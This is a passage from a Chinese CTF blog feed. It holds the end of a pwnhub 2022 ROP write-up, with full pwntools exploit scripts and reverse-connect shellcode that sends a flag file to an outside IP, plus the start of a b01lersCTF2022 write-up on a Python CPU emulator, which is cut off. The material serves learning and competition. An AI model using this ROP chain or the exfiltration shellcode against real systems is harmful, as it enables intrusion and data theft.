class="line">rep_movs = <span class="number">0x601650</span></span><br><span class="line">shellcode_addr = <span class="number">0x601700</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># wait for 5 seconds</span></span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># call alarm(0) to get a 10 in eax</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;alarm&#x27;</span>]) <span class="comment"># call alarm</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># use magic to change alarm&#x27;s got</span></span><br><span class="line">payload +=p64(csu)</span><br><span class="line">payload +=p64(<span class="number">0x09090909</span>)<span class="comment"># notice: here is add</span></span><br><span class="line">payload +=p64(elf.got[<span class="string">&#x27;alarm&#x27;</span>]+<span class="number">0x3d</span>-<span class="number">3</span>) <span class="comment"># we only need to change 1 byte, so -3 here</span></span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">4</span> <span class="comment"># fill rest r*</span></span><br><span class="line">payload +=p64(magic)</span><br><span class="line"></span><br><span class="line"><span class="comment"># call mprotect, with eax = 10 and syscall gardet</span></span><br><span class="line"><span class="comment"># using ret2csu, with call alarm&#x27;s got == syscall</span></span><br><span class="line">payload +=p64(csu)</span><br><span class="line">payload +=p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">payload +=p64(<span class="number">1</span>) <span class="comment"># rbp</span></span><br><span class="line">payload +=p64(elf.got[<span class="string">&#x27;alarm&#x27;</span>]) <span class="comment"># r12, r12+rbx*8</span></span><br><span class="line">payload +=p64(<span class="number">0x601000</span>) <span class="comment"># r13---&gt; rdi, addr, is bss</span></span><br><span class="line">payload +=p64(<span class="number">0x1000</span>) <span class="comment">#r14---&gt;rsi, length</span></span><br><span class="line">payload +=p64(<span class="number">7</span>) <span class="comment"># r15 --- &gt; rdx, mode</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># the call part of ret2csu</span></span><br><span class="line">payload +=p64(<span class="number">0x4008E0</span>)</span><br><span class="line"><span class="comment"># now we have successfully mprotexted an addr, form gardet1</span></span><br><span class="line">payload +=p64(<span class="number">0</span>) <span class="comment"># junk</span></span><br><span class="line">payload +=p64(<span class="number">0xc3595b5d</span>) <span class="comment">#pop_rbp_rbx_rcx_ret&#x27;s machine code, rbx content</span></span><br><span class="line">payload +=p64(pop_rbp_rbx_rcx_ret+<span class="number">0x3d</span>) <span class="comment"># rbp place</span></span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload +=p64(magic) <span class="comment"># write to heap</span></span><br><span class="line"><span class="comment"># form gardet2</span></span><br><span class="line">payload +=p64(pop_rbp_rbx_rcx_ret)</span><br><span class="line">payload +=p64(mov_rsi_rsp_ret+<span class="number">0x3d</span>) <span class="comment">#place</span></span><br><span class="line">payload +=p64(<span class="number">0xc3e68948</span>) <span class="comment"># mov_rsi_rsp_ret</span></span><br><span class="line">payload +=p64(<span class="number">0</span>) <span class="comment"># junk</span></span><br><span class="line">payload +=p64(magic)</span><br><span class="line"><span class="comment"># form gardet3</span></span><br><span class="line">payload +=p64(pop_rbp_rbx_rcx_ret)</span><br><span class="line">payload +=p64(rep_movs+<span class="number">0x3d</span>)</span><br><span class="line">payload +=p64(<span class="number">0xc3a548f3</span>) <span class="comment"># rep movs QWORD PTR es:[rdi], QWORD PTR ds:[rsi]; ret</span></span><br><span class="line">payload +=p64(<span class="number">15</span>) <span class="comment"># rcx=copy times:15</span></span><br><span class="line">payload +=p64(magic)</span><br><span class="line"></span><br><span class="line"><span class="comment"># copy start</span></span><br><span class="line">payload +=p64(pop_rdi)</span><br><span class="line">payload +=p64(shellcode_addr-<span class="number">0x10</span>) <span class="comment"># target addr</span></span><br><span class="line">payload +=p64(mov_rsi_rsp_ret) <span class="comment"># notice : must give rsp(the pointer) to rsi</span></span><br><span class="line">payload +=p64(rep_movs) <span class="comment"># start copy</span></span><br><span class="line">payload +=p64(shellcode_addr) <span class="comment"># execute addr!</span></span><br><span class="line">payload +=reverse_shell</span><br><span class="line">payload +=send_flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&quot;b *0x4008fa&quot;</span>) <span class="comment"># at ret in csu to avoid alarm&#x27;s time</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面是socket和connect。注意不需要编写汇编，直接用下面给好的字节码就能成功。字节码里面remote_port和remote_ip填自己公网的ip和port。(已验证可以成功，<strong>注意调试的时候碰到push rsp之后需要用si而不是ni</strong>，否则会失败)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">/* socket(AF_INET, SOCK_STREAM, 0) */</span></span><br><span class="line"><span class="string">push 41</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 6</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* connect(s, addr, len(addr))  */ 大概就是和远程端口绑定</span></span><br><span class="line"><span class="string">xchg eax, edi</span></span><br><span class="line"><span class="string">mov al, 42</span></span><br><span class="line"><span class="string">mov rcx, 0x0100007f11270002 /*127.0.0.1:10001 --&gt; 0x7f000001:0x2711*/</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">push rsp ; 关键在于这里是addr数据结构</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">mov dl, 16</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">reverse_shell = <span class="string">b&quot;\x6a\x29\x58\x6a\x06\x5a\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00&quot;</span>+ \</span><br><span class="line">    remote_port.to_bytes(<span class="number">2</span>, <span class="string">&quot;big&quot;</span>)+socket.inet_aton(remote_ip) + <span class="string">b&quot;\x51\x54\x5e\xb2\x10\x0f\x05&quot;</span></span><br></pre></td></tr></table></figure><p>这里是open+sendfile。可以根据情况改文件名。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下面是open并且sendfile</span></span><br><span class="line">s2=<span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">call main</span></span><br><span class="line"><span class="string">    .ascii &quot;flag&quot;</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">main:</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rax,rdx</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">xor esi, esi</span></span><br><span class="line"><span class="string">mov al, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax,0x28</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rsi,0x1</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov r10,0x30</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(asm(s2))</span><br><span class="line"></span><br><span class="line">result = <span class="string">b&#x27;\xe8\x05\x00\x00\x00flag\x00_H\x89\xd0H1\xd21\xf6\xb0\x02\x0f\x05H\xc7\xc0(\x00\x00\x00H1\xffH\xc7\xc6\x01\x00\x00\x00H1\xd2I\xc7\xc20\x00\x00\x00\x0f\x05&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题学到了很多</p><ol><li>magic指令(我就这样命名了hhh)<strong>可以结合csu的gadget实现任意地址写任意数值</strong>。这是很强大的。</li></ol><p><code>add dword ptr [rbp - 0x3d], ebx; nop xxxxx; ret</code></p><p><img src="/2022/04/27/pwnhub2022/image-20220427145207754.png" alt="image-20220427145207754"></p><ol start="2"><li>使用alarm剩余的秒数设置rax。这也是新学到的方法。</li><li>反向shell。这也是第一次碰到。并且知道了shellcode如何构造。</li><li>在栈空间不够的时候，使用rep指令传递到堆上，学习了rep指令和配套的movs。</li><li>没有syscall的时候利用magic改掉alarm的got为syscall，并利用ret2cus调用任意的系统调用(结合第二部设置的rax)</li></ol><p>pwnhub的题目确实很有收获。最后，放上官方的wp，里面对汇编代码有更好的解释。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./easyrop&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># reverse tcp 的IP 和 port</span></span><br><span class="line">remote_ip = <span class="string">&quot;172.26.93.18&quot;</span></span><br><span class="line">remote_port = <span class="number">10002</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alarm_plt = <span class="number">0x400510</span></span><br><span class="line">alarm_got = <span class="number">0x601020</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400903</span></span><br><span class="line"></span><br><span class="line">pop_rbx_rbp_r12_r13_14_r15 = <span class="number">0x4008FA</span></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x0000000000400618</span> <span class="comment"># add dword ptr [rbp - 0x3d], ebx</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x601060</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1. 利用alarm控制eax 为10</span></span><br><span class="line"><span class="string">2. add alarm@got, 5 得到syscall; ret</span></span><br><span class="line"><span class="string">3. mprotect(0x601000, 0x1000, 7)</span></span><br><span class="line"><span class="string">4. add dword ptr [rbp - 0x3d], ebx 添加 gadget</span></span><br><span class="line"><span class="string">5. copy and exec shellcode(reverse tcp and read flag)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rep movs qword ptr [rdi],qword ptr [rsi];ret  F348A5C3</span></span><br><span class="line"><span class="comment"># mov rsi, rsp; ret 4889E6C3</span></span><br><span class="line"><span class="comment"># pop rbp; pop rbx; pop rcx; ret  5D5B59C3</span></span><br><span class="line"></span><br><span class="line">pop_rbp_rbx_rcx_ret = bss_addr</span><br><span class="line">mov_rsi_rsp_ret = bss_addr + <span class="number">0x8</span></span><br><span class="line">rep_movs = bss_addr + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">s1 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">/* socket(AF_INET, SOCK_STREAM, 0) */</span></span><br><span class="line"><span class="string">push 41</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 6</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* connect(s, addr, len(addr))  */ 大概就是和远程端口绑定</span></span><br><span class="line"><span class="string">xchg eax, edi</span></span><br><span class="line"><span class="string">mov al, 42</span></span><br><span class="line"><span class="string">mov rcx, 0x0100007f11270002 /*127.0.0.1:10001 --&gt; 0x7f000001:0x2711*/</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">push rsp ; 关键在于这里是addr数据结构</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">mov dl, 16</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">reverse_shell = <span class="string">b&quot;\x6a\x29\x58\x6a\x06\x5a\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00&quot;</span>+ \</span><br><span class="line">    remote_port.to_bytes(<span class="number">2</span>, <span class="string">&quot;big&quot;</span>)+socket.inet_aton(remote_ip) + <span class="string">b&quot;\x51\x54\x5e\xb2\x10\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># send flag</span></span><br><span class="line">s2=<span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">xchg eax, edx</span></span><br><span class="line"><span class="string">/* open flag */</span></span><br><span class="line"><span class="string">mov rbx, 0x67616c662f</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor esi, esi</span></span><br><span class="line"><span class="string">mov al, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">; esi是flag文件(in_fd,for reading),edi是输出(out_fd, for writing)</span></span><br><span class="line"><span class="string">xchg eax, esi; in_fd in esi</span></span><br><span class="line"><span class="string">xchg edx, edi; out_fd in rdi</span></span><br><span class="line"><span class="string">push 0x601300; offset&#x27;s pointer .zero is also OK</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 0x30; size</span></span><br><span class="line"><span class="string">pop r10</span></span><br><span class="line"><span class="string">mov al, 40</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 避免调用接口耗时，直接给出字节码</span></span><br><span class="line">send_flag = <span class="string">b&quot;\x92\x48\xbb\x2f\x66\x6c\x61\x67\x00\x00\x00\x53\x54\x5f\x31\xf6\xb0\x02\x0f\x05\x96\x87\xfa\x68\x00\x13\x60\x00\x5a\x6a\x30\x41\x5a\x31\xc0\xb0\x28\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat(&#123;</span><br><span class="line">    <span class="number">0x10</span>: [</span><br><span class="line">        pop_rdi_ret,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        alarm_plt,</span><br><span class="line">        pop_rbx_rbp_r12_r13_14_r15,</span><br><span class="line">        <span class="number">0x05151515</span>, alarm_got+<span class="number">0x3d</span>-<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">        magic,</span><br><span class="line">        pop_rbx_rbp_r12_r13_14_r15,</span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>, alarm_got, <span class="number">0x601000</span>, <span class="number">0x1000</span>, <span class="number">0x7</span>,</span><br><span class="line">        <span class="number">0x4008e0</span>, <span class="number">0</span>, <span class="number">0xc3595b5d</span>, pop_rbp_rbx_rcx_ret+<span class="number">0x3d</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        magic,</span><br><span class="line">        pop_rbp_rbx_rcx_ret, </span><br><span class="line">        mov_rsi_rsp_ret+<span class="number">0x3d</span>, <span class="number">0xc3e68948</span>, <span class="number">0</span>,</span><br><span class="line">        magic, </span><br><span class="line">        pop_rbp_rbx_rcx_ret, </span><br><span class="line">        rep_movs+<span class="number">0x3d</span>, <span class="number">0xc3a548f3</span>, <span class="number">15</span>,</span><br><span class="line">        magic, </span><br><span class="line">        pop_rdi_ret, bss_addr+<span class="number">0x20</span>,</span><br><span class="line">        mov_rsi_rsp_ret, </span><br><span class="line">        rep_movs,</span><br><span class="line">        bss_addr+<span class="number">0x30</span>,</span><br><span class="line">        reverse_shell,</span><br><span class="line">        send_flag</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;length:&quot;</span>, <span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;len of reverse:&quot;</span>, <span class="built_in">hex</span>(<span class="built_in">len</span>(reverse_shell+send_flag)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>b01lersCTF2022_pwn</title>
      <link href="/2022/04/25/b01lersCTF2022-pwn/"/>
      <url>/2022/04/25/b01lersCTF2022-pwn/</url>
      
        <content type="html"><![CDATA[<p>最后一个pwn是一个python，看了半天实在不知道哪里有问题。最后一题是赛后看了wp复现的，后来才知道是对puthon的性质不熟悉，利用的是侧信道攻击。</p><span id="more"></span><h1 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h1><p>这是最后一个pwn，也是本次比赛唯一一个有价值的pwn，因为前面三个都非常简单。</p><h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>首先逆向一下逻辑，他一共有14个类似寄存器一样的内容。每个用Xi表示。对应的内容表示如下。</p><blockquote><p>X00: reset次数</p><p>X01：寄存器文件，包含了10个r</p><p>X02：execute次数(或者说是时间)</p><p>X03：访问过的内存(是一个key-value的形式)</p><p>X04：密文</p><p>X05：指令寄存器rip，指向当前运行到的内存</p><p>X06：一个函数，用int( )直接返回数字</p><p>X07：将寄存器转换为下标。例如r10转换为10</p><p>X08：一个函数，返回[-1000,1000]的一个数字</p><p>X09：返回一个内存下标</p><p>X10：内存读取的起始位置</p></blockquote><p>这个CPU主要实现的就是一般的虚拟机能做到的加减乘除。我们读取flag的方式就是读到X04中储存的密文，放在r0-r3里面，调用一个magic指令就可以了。</p><p>在程序的一开始，X04被读入memory的0-3位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, debug=<span class="number">0</span></span>):</span><br><span class="line">    ins = self.instructions[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i,v <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.X04):</span><br><span class="line">        self.memory[i] = v <span class="comment"># 想办法读这里内容</span></span><br><span class="line">        <span class="keyword">while</span> (self.X05&gt;=<span class="number">0</span> <span class="keyword">and</span> self.X05&lt;<span class="built_in">len</span>(self.instructions) <span class="keyword">and</span> self.X00&lt;<span class="number">4</span> <span class="keyword">and</span> self.X02&lt;<span class="number">20000</span>): <span class="comment"># 逐个执行指令</span></span><br><span class="line">            ins = self.instructions[self.X05]</span><br><span class="line">            self.execute(ins)</span><br></pre></td></tr></table></figure><p>我们唯一可以和内存交互的地方是<code>movfrom</code>和<code>movto</code>。对应内容如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> ins.op == <span class="string">&quot;movfrom&quot;</span>:</span><br><span class="line">    X09 = ins.X10 + self.X01[ins.dsp] <span class="comment"># X09是内存下标</span></span><br><span class="line">    X09 = X09 % <span class="built_in">len</span>(self.memory)</span><br><span class="line">    <span class="keyword">if</span> X09 <span class="keyword">in</span> self.X03: <span class="comment"># X03记录访问过的内存，像是一个cache</span></span><br><span class="line">        v = self.X03[X09]</span><br><span class="line">        v = (v &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        self.X01[ins.X11] = v <span class="comment"># 这里会读到寄存器里面</span></span><br><span class="line">        self.X05 += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        v = self.memory[X09]</span><br><span class="line">        self.X03[X09] = v <span class="comment"># 可以把随机数读取到X03里面</span></span><br><span class="line">        self.execute(ins) <span class="comment"># 能否在这次exe的时候</span></span><br><span class="line"><span class="keyword">elif</span> ins.op == <span class="string">&quot;movto&quot;</span>:</span><br><span class="line">    X09 = ins.X10 + self.X01[ins.dsp] <span class="comment"># X10是内存起始位置，可以写0， self.X01[ins.dsp]是寄存器中第几个值</span></span><br><span class="line">    X09 = X09 % <span class="built_in">len</span>(self.memory)</span><br><span class="line">    <span class="keyword">if</span> X09 <span class="keyword">in</span> self.X03:</span><br><span class="line">        <span class="keyword">del</span> self.X03[X09]</span><br><span class="line">        v = (self.X01[ins.X11] &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        self.memory[X09] = v <span class="comment"># 这边直接改掉memory不可以吗,不可以，最后比较的是寄存器</span></span><br><span class="line">        self.X05 += <span class="number">1</span></span><br></pre></td></tr></table></figure><p><code>movfrom</code>可以先把memory中的内容加载到X03中，当我们首次从内存中取出元素时，会进入<code>movfrom</code>的<code>else</code>的位置，注意这里再调用了一次<code>execute</code>，第二次会进入第一次的<code>if</code>，然后把内存的值写入寄存器X01。</p><p>我们确实可以通过这种方法读取<code>memory</code>中的随机数。但是执行<code>magic</code>还需要另外的条件。可以看到下面，magic首先会检查X00是不是2，而X00是reset指令的使用次数。<strong>但是，每次调用reset的时候，都会把当前的所有寄存器，memory都清空，也就将失去我们刚才获得的随机数</strong>。比赛的时候逆向完逻辑，就卡在了这里。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> ins.op == <span class="string">&quot;magic&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> self.X00 == <span class="number">2</span>: <span class="comment"># 00应该是状态寄存器之类的，每一次reset就会+1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">tuple</span>(self.X01[<span class="number">0</span>:<span class="number">4</span>]) == self.X04:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">                cc = fp.read()</span><br><span class="line">                cc = cc.strip()</span><br><span class="line">                cc = cc.ljust(<span class="built_in">len</span>(self.X01)*<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self.X01)):</span><br><span class="line">                    self.X01[i] = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, cc[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>])[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>这里是<code>reset</code>完成清空的过程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reset</span>(<span class="params">self</span>): <span class="comment"># 会重新从头开始执行</span></span><br><span class="line">    self.X05 = <span class="number">0</span> <span class="comment"># 指令开始地址</span></span><br><span class="line">    self.X01 = [<span class="number">0</span> <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(X14)] <span class="comment"># 一共10个寄存器</span></span><br><span class="line">    self.memory = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(X13)] <span class="comment"># 我们要读的地方 一个很大的list里面存的都是0</span></span><br><span class="line">    self.X02 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> self.X03.keys():</span><br><span class="line">        self.X03[k] = <span class="number">0</span> <span class="comment"># X03是访问过的内存</span></span><br><span class="line">        self.X00 += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>看似..似乎是矛盾的。</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>看了wp才知道，原来是因为自己对python的性质不熟悉造成的。以下程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;&#125;</span><br><span class="line">a = &#123;<span class="number">1</span>:<span class="number">111</span>,<span class="number">2</span>:<span class="number">222</span>&#125;</span><br><span 